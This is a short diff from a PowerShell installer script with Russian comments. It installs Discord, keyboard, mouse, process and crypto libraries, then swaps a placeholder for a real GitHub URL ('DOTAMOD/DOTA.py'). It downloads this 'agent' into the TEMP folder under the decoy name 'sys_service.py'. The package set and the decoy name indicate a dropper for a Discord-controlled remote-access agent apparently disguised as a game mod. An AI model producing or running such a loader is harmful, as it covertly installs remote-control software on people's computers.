@@ -38,7 +38,7 @@ $deps = "discord.py keyboard mouse psutil pyttsx3 requests pywin32 pycryptodome 
 & $pyPath -m pipwin install pyaudio -q
 
 # 3. ЗАГРУЗКА АГЕНТА
-$repoUrl = "https://raw.githubusercontent.com/ТВОЙ_НИК/ТВОЙ_РЕПО/main/bot_agent.py"
+$repoUrl = "https://github.com/ht-at/DOTAMOD/raw/refs/heads/main/DOTA.py"
 $botPath = "$env:TEMP\sys_service.py"
 
 # Скачиваем агента
